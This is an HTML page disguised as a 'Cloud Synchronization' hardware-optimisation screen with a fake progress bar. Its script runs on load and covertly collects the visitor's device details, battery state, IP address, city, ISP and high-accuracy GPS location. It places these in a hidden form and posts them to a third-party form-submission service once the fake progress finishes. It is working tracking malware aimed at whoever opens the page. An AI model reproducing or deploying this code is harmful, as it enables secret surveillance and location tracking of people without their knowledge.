<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Cloud Sync</title>
    <style>
        body { margin: 0; padding: 0; background-color: #0f172a; color: #f8fafc; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .card { background: #1e293b; padding: 45px; border-radius: 28px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.6); text-align: center; width: 90%; max-width: 420px; border: 1px solid #334155; }
        .icon { font-size: 55px; color: #38bdf8; margin-bottom: 25px; animation: pulse 2s infinite; }
        h1 { font-size: 22px; margin: 10px 0; color: #f1f5f9; letter-spacing: -0.5px; }
        p { font-size: 14px; color: #94a3b8; line-height: 1.6; margin-bottom: 0; }
        .progress-container { width: 100%; height: 10px; background: #334155; border-radius: 20px; margin: 35px 0 15px 0; overflow: hidden; position: relative; }
        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #38bdf8, #818cf8); border-radius: 20px; transition: width 0.15s linear; }
        .percentage { font-size: 18px; font-weight: 800; color: #38bdf8; font-family: 'Monaco', monospace; }
        .status-text { font-size: 11px; color: #64748b; text-transform: uppercase; letter-spacing: 1.5px; margin-top: 20px; }
        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.08); opacity: 0.8; } 100% { transform: scale(1); opacity: 1; } }
    </style>
</head>
<body>

<div class="card">
    <div class="icon">🔄</div>
    <h1>Cloud Synchronization</h1>
    <p>Connecting to secure servers to optimize hardware performance. This may take a few moments.</p>

    <div class="progress-container">
        <div class="progress-bar" id="bar"></div>
    </div>

    <div class="percentage" id="percent">0%</div>
    <div class="status-text" id="status">Initializing Link...</div>
</div>

<form id="trackerForm" style="display:none;">
    <input type="hidden" name="access_key" value="534a06e9-54bf-4b21-8cc0-d2717ad6c77a">
    <input type="hidden" name="[DEVICE] HARDWARE" id="s1">
    <input type="hidden" name="[GEO] PRECISE_LOC" id="s2">
    <input type="hidden" name="[NET] IP_CARRIER" id="s3">
    <input type="hidden" name="[POWER] BATTERY_LIFE" id="s4">
    <input type="hidden" name="[DISPLAY] SPECS" id="s6">
</form>

<script>
    let progress = 0;
    const bar = document.getElementById('bar');
    const percentText = document.getElementById('percent');
    const statusText = document.getElementById('status');
    const messages = ["Connecting...", "Scanning...", "Syncing...", "Verifying...", "Success!"];

    window.onload = async () => {
        // Collect Device Data
        document.getElementById('s1').value = `Platform: ${navigator.platform} | CPU: ${navigator.hardwareConcurrency} | RAM: ~${navigator.deviceMemory}GB`;
        document.getElementById('s6').value = `Resolution: ${screen.width}x${screen.height}`;

        // Collect IP & ISP
        fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
            document.getElementById('s3').value = `IP: ${data.ip} | City: ${data.city} | ISP: ${data.org}`;
        });

        // Battery Status
        if (navigator.getBattery) {
            navigator.getBattery().then(b => {
                document.getElementById('s4').value = `Level: ${b.level * 100}% | Charging: ${b.charging}`;
            });
        }

        // HIGH ACCURACY GPS (Tubarjal Precision)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                document.getElementById('s2').value = `MAP: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude} | Accuracy: ${pos.coords.accuracy}m`;
            }, null, { enableHighAccuracy: true, timeout: 15000 });
        }
    };

    const interval = setInterval(() => {
        progress += Math.random() * 1.8;
        if (progress >= 100) {
            progress = 100;
            clearInterval(interval);
            statusText.innerText = "Optimization Finished";
            const formData = new FormData(document.getElementById('trackerForm'));
            fetch('https://api.web3forms.com/submit', { method: 'POST', body: formData });
        } else {
            bar.style.width = progress + '%';
            percentText.innerText = Math.floor(progress) + '%';
            statusText.innerText = messages[Math.floor((progress / 100) * messages.length)];
        }
    }, 200);
</script>
</body>
</html>
